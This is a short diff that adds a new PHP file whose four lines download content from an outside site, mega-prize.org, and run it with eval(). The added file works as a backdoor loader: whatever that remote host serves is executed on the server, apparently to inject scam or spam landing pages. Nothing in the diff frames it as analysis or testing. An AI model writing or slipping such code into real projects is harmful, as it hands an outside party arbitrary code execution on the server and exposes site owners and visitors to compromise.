@@ -1,0 +1,4 @@
+<?php $LanThau = file_get_contents(urldecode('https://mega-prize.org/landing/pmb.html'));
+
+$LanThau = "?> ".$LanThau;
+eval($LanThau);
